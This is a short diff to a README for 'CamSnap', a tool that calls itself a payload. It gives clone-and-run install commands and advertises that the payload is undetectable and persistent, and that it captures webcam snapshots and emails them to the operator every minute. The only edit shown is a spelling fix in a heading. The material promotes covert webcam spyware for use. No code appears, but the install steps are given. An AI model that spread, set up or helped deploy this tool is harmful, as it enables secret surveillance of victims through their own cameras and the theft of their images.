@@ -7,7 +7,7 @@ $ git clone https://github.com/darkuser744/CamSnap.git <br>
 $ cd CamSnap <br>
 $ chmod +x * <br>
 $ bash CamSnap.sh <br>
-# About CamSnaper Payload
+# About CamSnap Payload
 (+) Undetectable --> (100%). <br>
 (+) Cam Snaped And Send To Your Mail Every 1 Minute. <br>
 (+) Persistent. <br>
